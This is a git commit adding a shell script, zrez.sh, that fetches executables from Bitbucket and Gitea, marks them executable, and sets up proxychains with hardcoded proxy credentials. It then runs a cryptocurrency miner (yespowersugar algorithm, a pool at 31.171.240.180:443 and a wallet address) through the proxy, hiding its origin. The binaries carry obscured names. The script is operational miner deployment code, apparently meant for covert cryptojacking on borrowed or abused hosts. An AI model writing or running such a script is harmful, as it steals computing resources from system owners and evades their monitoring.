fa8f6592dbb1534dbd718a8d9a878afee4bd37ea
maskurniawan <57574729+tolecilik@users.noreply.github.com>
2023-12-12 13:41:24 +0700

    Create zrez.sh

---
+++ zrez.sh
@@ -0,0 +1,22 @@
+proxy="52.5.38.201" 
+port="9293" 
+user="py8h6mtimyeool"  
+pass="r1wr4kibq49lw0k52qhi17h0ke1j" 
+wget -q -O xza https://bitbucket.org/mandaresz/feriyaz/downloads/Zrex && chmod +x xza
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf" 
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./xza -a yespowersugar -o 31.171.240.180:443 -u sugar1q2ftu7r240gmm79uj0p78lmcnf6dj2m94c5uy46.$(echo $(shuf -i 1-9 -n 1)-ambar) -p --proxy=http://py8h6mtimyeool:r1wr4kibq49lw0k52qhi17h0ke1j@52.7.247.138:9293
